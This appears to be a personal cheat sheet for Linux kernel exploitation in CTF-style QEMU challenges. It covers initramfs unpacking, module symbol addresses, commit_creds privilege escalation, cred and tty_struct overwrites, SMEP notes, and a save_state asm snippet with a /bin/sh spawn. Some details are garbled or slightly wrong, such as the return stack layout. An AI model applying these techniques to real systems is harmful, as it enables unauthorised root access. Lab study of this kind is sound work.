# decompress filesystem
mkdir fs
cd fs
cp ../core.cpio core.cpio.gz #  copy the cpio file into the folder and change the suffix
gunzip ./core.cpio.gz 
cpio -idm < ./core.cpio
#if file system is already .gz with file type gzip
gzip -cd ../initramfs.cpio.gz | cpio -imd --quiet
# compress filesystem
find . -print0 | cpio --null -ov --format=newc | gzip -9 > core.cpio
#for a ext2/3/4 filesystem
mount it on the host while qemu is off, make changes, unmount then boot qemu.
mount -o loop,offset=offset /path/to/disk_image /mnt/mount_point
# setsid to 0 to get root->
to access /sys/module/name_of_module/sections/.text for address of .text section of module
/proc/kallsyms for all symbols.
change uid to 0 in /etc/passwd
# Use extract-vmlinux script in linux-headers to extract vmlinux from bzImage
/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux
# cat /sys/module/name_of_module/sections/.text->address of .text sectiion of loaded module.
# load debug info:add-symbol-file /path/to/module 0xd081d000 \  #  .text
 		-s .data 0xd08232c0 \
		-s .bss  0xd0823e20
# find .text address of exploit->:readelf -WS ./exploit | grep .text | awk '{ print "0x"$5 }'
# call commit_creds(prepare_kernel_cred(0)) to get root LPE
# open the dev file created in /dev or /proc or /sys to interact with the kernel module.
# use functions like read(),write(),ioctl() to interact with the device, this will trigger a call to device_read(),device_write(),etc.
# if you obtain major number with register_chrdev(), you need to manually make the device file.
# proc_create automatically creates the device file in /proc
# usually, there are no libraries on the qemu system, so compile the exploit with gcc -static -o exploit exploit.c
# size of cred struct is 0xa8.
# size of tty_struct is 0x2e0.
# Different attacks:
overwrite cred struct directly.
first allocate a cred struct with fork() and then use UAF to overwrite this.
change tty_struct ops.
if smep is enabled, cannot directly call any user-space function with level0 privilage.
we need to be level0 to call commit_creds(prepare_kernel_cred(0)), which will elevate the privilage level of the process.
openning /dev/ptmx will create a new tty_struct 
iretq uses the values of ss,rip,cs,eflags,user stack location, hence we need to save these for future use.
char *args[]={"/bin/sh",NULL}; execve("/bin/sh",args,NULL) is needed to spqwn shell.
To define kernel functions, first create a typedef with: ret_type(typedefname)(args) and then define with function with typedefname addr.Example:
typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0xffffffff810a1420;
to define gadget addresses, for example:
unsigned long poprdi = 0xffffffff813e7d6f;
unsigned long user_cs, user_ss, user_rflags;
eax is exactly the address of the instruction to be executed when the ioctl is executed
#save state used to return back to user-space from kernel-space with iterq
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
	"movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :
        : "memory");
}

stack layout while returning: r_rip;user_cs;user_rflags;user_rbp;user_ss;





